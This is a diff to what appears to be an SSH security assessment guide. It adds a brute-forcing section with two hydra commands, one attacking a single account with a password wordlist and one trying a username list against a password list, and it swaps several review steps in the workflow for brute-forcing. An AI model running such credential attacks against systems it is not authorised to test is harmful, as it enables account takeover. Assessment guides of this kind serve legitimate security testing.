@@ -105,7 +105,19 @@ Assessment questions:
 
 ---
 
-# Brute Force SSH
+# Brute-Forcing SSH
+
+Brute-forcing a single user with a wordlist:
+
+```bash
+hydra -l [username] -P [path/to/password_list.txt] ssh://[target_ip]
+```
+
+To attack a list of usernames against a list of passwords:
+
+```bash
+hydra -L [path/to/usernames_list.txt] -P [path/to/password_list.txt] -t 4 ssh://[target_ip]
+```
 
 # SSH Key Assessment
 
@@ -187,13 +199,7 @@ Review Banner Information
 Validate Connectivity
         |
         v
-Review Authentication Methods
-        |
-        v
-Assess SSH Keys
-        |
-        v
-Review User Access
+Brute-Forcing SSH
         |
         v
 Identify Misconfigurations
